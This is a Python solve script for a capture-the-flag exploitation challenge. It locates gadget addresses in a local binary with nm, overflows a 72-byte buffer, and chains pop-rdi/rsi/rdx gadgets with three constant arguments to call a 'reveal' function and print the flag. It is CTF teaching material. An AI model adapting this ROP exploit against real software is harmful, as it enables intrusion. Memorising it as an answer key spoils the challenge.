#!/usr/bin/env python3
from __future__ import annotations

import struct
import subprocess
from pathlib import Path


ARG1 = 0x1337C0DECAFEF00D
ARG2 = 0x4142434445464748
ARG3 = 0xDEADBEEF10203040


def symbol_address(binary: Path, name: str) -> int:
    output = subprocess.check_output(["nm", "-an", binary], text=True)
    for line in output.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[2] == name:
            return int(parts[0], 16)
    raise SystemExit(f"symbol not found: {name}")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"

    ret = symbol_address(binary, "gadget_ret")
    pop_rdi = symbol_address(binary, "gadget_pop_rdi")
    pop_rsi = symbol_address(binary, "gadget_pop_rsi")
    pop_rdx = symbol_address(binary, "gadget_pop_rdx")
    reveal = symbol_address(binary, "reveal")

    payload = b"A" * 72
    payload += struct.pack("<Q", ret)
    payload += struct.pack("<Q", pop_rdi)
    payload += struct.pack("<Q", ARG1)
    payload += struct.pack("<Q", pop_rsi)
    payload += struct.pack("<Q", ARG2)
    payload += struct.pack("<Q", pop_rdx)
    payload += struct.pack("<Q", ARG3)
    payload += struct.pack("<Q", reveal)

    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
